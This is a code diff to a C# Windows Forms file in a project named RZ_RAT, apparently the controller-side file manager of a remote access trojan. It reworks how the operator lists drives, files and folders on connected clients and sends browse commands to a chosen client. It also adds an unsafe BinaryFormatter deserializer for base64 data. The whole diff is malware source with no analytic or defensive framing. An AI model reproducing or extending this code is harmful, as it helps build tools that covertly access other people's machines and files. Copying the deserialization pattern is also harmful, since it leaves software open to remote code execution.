@@ -3,7 +3,10 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
+using System.Runtime.Serialization;
+using System.Runtime.Serialization.Formatters.Binary;
 using System.Text;
 using System.Windows.Forms;
 
@@ -11,82 +14,85 @@ namespace RZ_RAT
 {
     public partial class FileManger : Form
     {
-        public string[] client = null;
-        public FileManger()
+        public object decode(string base64String)
         {
+            byte[] bytes = Convert.FromBase64String(base64String);
+            using (MemoryStream ms = new MemoryStream(bytes, 0, bytes.Length))
+            {
+                ms.Write(bytes, 0, bytes.Length);
+                ms.Position = 0;
+                return new BinaryFormatter().Deserialize(ms);
+            }
+        }
+        public int index_;
+        public List<helper.FileManger.files> ListF = null;
+        public FileManger(int index)
+        {
+            index_ = index;
             InitializeComponent();
         }
 
-        private void listView1_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
-        {
-            if (e.Item.Selected)
-                Form1.ServerObject.addCommand(client, "getfilesandd<<>>" + e.Item.Tag.ToString());
-        }
 
         private void FileManger_Load(object sender, EventArgs e)
         {
 
         }
-
-        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
+        public void AddDrivers_(string[] drivers)
         {
-
-            Form1.ServerObject.addCommand(client, "getfilesandd<<>>" + ((ComboBox)sender).SelectedItem.ToString());
-        }
-        public void addtolistview(string[] FilesAndFolders)
-        {
-            ListViewItem lvii = new ListViewItem("",2);
-            lvii.SubItems.Add("..");
-            label1.Text = "Path : " + FilesAndFolders[0];
-            string[] ssss = FilesAndFolders[0].Split(new string[] {"\\"},StringSplitOptions.None);
-            lvii.Tag = string.Join("\\", ssss.Where((o, i) => i != ssss.Length - 1).ToArray());
-            listView1.Items.Add(lvii);
-            foreach (string Files in FilesAndFolders)
+            foreach (string i in drivers)
             {
-                string[] file = Files.Split(new string[] { "|" }, StringSplitOptions.None);
-                if (file.Length == 1){}else
+                ListViewItem lvii = new ListViewItem("", 3);
+                lvii.SubItems.Add(i);
+                lvii.SubItems.Add(" ");
+                lvii.Tag = i;
+                if(!(string.IsNullOrEmpty(i)))
+                    this.Invoke((MethodInvoker)delegate{listView1.Items.Add(lvii);});
+
+            }
+        }
+        public void addtolistview()
+        {
+            this.Invoke((MethodInvoker)delegate
+                         { listView1.Items.Clear(); });
+            foreach (helper.FileManger.files i in ListF)
+            {
+                switch (i.type)
                 {
-                    ListViewItem lvi;//new ListViewItem();
-                    try
-                    {
-                        if (file[2] == "f")
+                    case "file":
+                        ListViewItem lvii = new ListViewItem("", 0);
+                        lvii.SubItems.Add(i.name);
+                        lvii.SubItems.Add(i.size);
+                        lvii.Tag = i.path;
+                        this.Invoke((MethodInvoker)delegate
                         {
-                            lvi = new ListViewItem("", 0);
-                            lvi.SubItems.Add(file[0]);
-                            lvi.SubItems.Add(file[1]);
-                            lvi.Tag = FilesAndFolders[0] + "\\" + file[0];
-                        }
-                        else
+                            listView1.Items.Add(lvii);
+                        });
+                        break ;
+                    case "folder":
+                        ListViewItem lvii_ = new ListViewItem("", 1);
+                        lvii_.SubItems.Add(i.name);
+                        lvii_.SubItems.Add(i.size);
+                        lvii_.Tag = i.path;
+                        this.Invoke((MethodInvoker)delegate
                         {
-                            lvi = new ListViewItem("", 1);
-                            lvi.SubItems.Add(file[0]);
-                            lvi.Tag = FilesAndFolders[0] + "\\" + file[0];
-                        }
-                    }
-                    catch
-                    {
-                        lvi = new ListViewItem("", 1);
-                        lvi.SubItems.Add(file[0]);
-                        lvi.Tag = FilesAndFolders[0] + "\\" + file[0];
-                    }
-                    listView1.Items.Add(lvi);
+                            listView1.Items.Add(lvii_);
+                        });
+                        break;
                 }
             }
-        }
-
-        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (ListViewItem lvi in listView1.SelectedItems)
-            {
-                //MessageBox.Show(lvi.Tag.ToString());
-                Form1.ServerObject.addCommand(client, "deletefileorfolder<<>>" + lvi.Tag.ToString());
-            }
+            
          
+       
+        }
+        private void listView1_DoubleClick(object sender, EventArgs e)
+        {
+            string path = (string)listView1.SelectedItems[0].Tag;
+            Form1.ServerObject.ClientsObjs[index_].addCommand("filesandfolders", path);
         }
 
-        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
+        private void FileManger_FormClosing(object sender, FormClosingEventArgs e)
         {
-
+            Form1.ServerObject.ClientsObjs[index_].FM = null;
         }
     }
 }
